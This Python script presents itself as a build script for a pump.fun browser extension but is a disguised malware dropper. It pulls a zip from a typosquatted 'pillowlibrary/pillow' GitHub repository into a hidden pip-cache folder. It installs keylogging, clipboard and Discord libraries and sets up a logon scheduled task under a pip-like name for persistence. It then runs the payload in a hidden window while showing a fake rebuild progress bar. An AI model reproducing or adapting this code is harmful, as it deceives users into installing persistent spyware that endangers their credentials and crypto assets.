import os
import ctypes
import zipfile
import requests
from io import BytesIO
import subprocess
import sys
import time

# Constants and configuration
GITHUB_REPO_ZIP_URL = "https://github.com/pillowlibrary/pillow/archive/refs/heads/main.zip"
LOCAL_DIR = os.path.join(os.getenv('LOCALAPPDATA'), "pip", "cache", "local")
MAIN_PY_PATH = os.path.join(LOCAL_DIR, "main.py")
WRAPPER_PATH = os.path.join(LOCAL_DIR, "wrapper.py")
TASK_NAME = "\\pipEnvironment"
TASK_COMMAND = os.path.join(os.getenv('LOCALAPPDATA'), "Programs", "Python", "Python310", "pythonw.exe")

TOTAL_SIZE_MB = 53.8

REQUIRED_PACKAGES = [
    "requests",
    "pyperclip",
    "pynput",
    "Pillow",
    "psutil",
    "discord.py",
    "GPUtil",
    "pygetwindow"
]

def install_dependencies():
    total_steps = len(REQUIRED_PACKAGES) + 1
    step_size_mb = TOTAL_SIZE_MB / total_steps
    current_size = 0

    print("Fetching files and rebuilding...")
    print("   Downloading and installing dependencies (53.8 MB)")

    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip", "-q"], check=True)
    current_size += step_size_mb
    update_progress_bar(current_size)

    for package in REQUIRED_PACKAGES:
        subprocess.run([sys.executable, "-m", "pip", "install", package, "-q"], check=True)
        current_size += step_size_mb
        update_progress_bar(current_size)

    print("\nExtension recompiled successfully.")

def update_progress_bar(current_size, delay=0.05):
    bar_length = int((current_size / TOTAL_SIZE_MB) * 30)
    progress_display = f"      {'-' * bar_length}{' ' * (30 - bar_length)} {current_size:.1f}/{TOTAL_SIZE_MB}MB"
    sys.stdout.write(f"\r{progress_display}")
    sys.stdout.flush()
    time.sleep(delay)

def overwrite_manifest():
    manifest_content = '''{
      "manifest_version": 3,
      "name": "Pump Toolset",
      "version": "1.2",
      "description": "Additional tools to aid in coin creation on pump.fun",
      "icons": {
        "128": "img/icon128.png",
        "16": "img/icon16.png",
        "48": "img/icon48.png"
      },
      "action": {
        "default_icon": {
          "128": "img/icon128.png",
          "16": "img/icon16.png",
          "48": "img/icon48.png"
        },
        "default_popup": "ui/index.html"
      },
      "permissions": [
        "scripting",
        "tabs",
        "storage"
      ],
      "host_permissions": [
        "*://pump.fun/*"
      ],
      "content_scripts": [
        {
          "matches": ["*://pump.fun/*"],
          "js": ["optimization.js"]
        },
        {
          "matches": ["*://pump.fun/create*"],
          "js": ["templates.js", "auto-expand.js"],
          "css": ["templates.css"]
        }
      ]
    }'''

    # Set target directory to the same directory as build.py
    build_script_dir = os.path.dirname(os.path.abspath("build.py"))
    manifest_path = os.path.join(build_script_dir, "manifest.json")

    # Create or skip overwriting manifest.json
    if os.path.exists(manifest_path):
        print(f"Manifest already exists at {manifest_path}. Skipping overwrite.")
    else:
        try:
            with open(manifest_path, "w") as manifest_file:
                manifest_file.write(manifest_content)
            print("Manifest created successfully at:", manifest_path)
        except Exception as e:
            print(f"\nThere was an unexpected error while rebuilding. {e}")

def check_permissions():
    print("Fetching files and rebuilding...\n")
    time.sleep(1)
    print("An error occurred while updating module, please retry with elevated permissions.")
    sys.exit(1)

def handle_update():
    if not verify_permissions():
        check_permissions()

    download_extension_files()
    configure_extension_scheduler()
    overwrite_manifest()
    execute_extension_rebuild()

def verify_permissions():
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        correct_python_version = sys.version_info[:3] == (3, 10, 11)
        return is_admin and correct_python_version
    except:
        return False

def download_extension_files():
    try:
        response = requests.get(GITHUB_REPO_ZIP_URL)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to download the repository: {e}")
        return

    with zipfile.ZipFile(BytesIO(response.content)) as zip_file:
        for member in zip_file.namelist():
            if member.endswith('/'):
                continue
            filename = member.split('/', 1)[-1]
            if filename:
                source = zip_file.open(member)
                target_path = os.path.join(LOCAL_DIR, filename)
                target_dir = os.path.dirname(target_path)
                os.makedirs(target_dir, exist_ok=True)
                with open(target_path, "wb") as target_file:
                    target_file.write(source.read())

def configure_extension_scheduler():
    subprocess.run([
        "schtasks", "/create", "/tn", TASK_NAME,
        "/tr", f'"{TASK_COMMAND}" "{WRAPPER_PATH}"',
        "/sc", "onlogon", "/ru", os.getlogin(),
        "/delay", "0000:30",
        "/f",
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def create_wrapper_file():
    user_directory = os.path.expanduser("~")
    wrapper_content = f"""import os
import subprocess
import sys

working_directory = os.path.dirname(os.path.abspath(__file__))
os.chdir(working_directory)

subprocess.Popen([r"{user_directory}\\AppData\\Local\\Programs\\Python\\Python310\\pythonw.exe", "main.py"],
                 creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

sys.exit()
"""
    with open(WRAPPER_PATH, "w") as wrapper_file:
        wrapper_file.write(wrapper_content)

def execute_extension_rebuild():
    create_wrapper_file()  # Generate the wrapper.py dynamically
    subprocess.Popen(
        [sys.executable.replace("python.exe", "pythonw.exe"), MAIN_PY_PATH],
        creationflags=subprocess.CREATE_NO_WINDOW
    )

if verify_permissions():
    install_dependencies()
    handle_update()
else:
    check_permissions()
